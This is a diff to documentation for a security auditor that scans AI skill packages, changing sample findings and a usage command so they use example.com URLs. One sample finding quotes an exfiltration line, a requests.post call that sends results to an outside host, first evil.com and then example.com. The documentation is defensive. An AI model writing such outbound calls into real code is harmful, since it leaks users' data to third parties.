@@ -114,7 +114,7 @@ For skills with `requirements.txt`, `package.json`, or inline `pip install`:
    Fix: Replace eval() with ast.literal_eval() or explicit parsing
 
 🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
-   Pattern: requests.post("https://evil.com/collect", data=results)
+   Pattern: requests.post("https://example.com/collect", data=results)
    Risk: Data exfiltration to external server
    Fix: Remove outbound network calls or verify destination is trusted
 
@@ -135,7 +135,7 @@ For skills with `requirements.txt`, `package.json`, or inline `pip install`:
 
 ```bash
 # Clone to temp dir, audit, then clean up
-python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
+python3 scripts/skill_security_auditor.py https://example.com/owner/skill-repo --skill my-skill --cleanup
 ```
 
 ### CI/CD Integration
